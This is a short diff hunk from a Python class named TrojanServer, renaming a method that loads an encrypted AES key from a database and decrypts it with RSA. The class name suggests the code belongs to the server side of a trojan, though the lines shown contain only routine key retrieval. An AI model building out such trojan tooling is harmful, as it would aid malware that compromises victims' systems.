@@ -111,7 +111,7 @@ class TrojanServer:
         self.db.save_key(encrypted)
         return aes_key
 
-    def load_aes_key_from_database(self): #sadsadsadasdasdasd
+    def retrieve_aes_key(self): #sadsadsadasdasdasd
         encrypted_key = self.db.get_last_key()
         aes_key = self.keys.decrypt_aes_key_with_rsa(encrypted_key)
         return aes_key
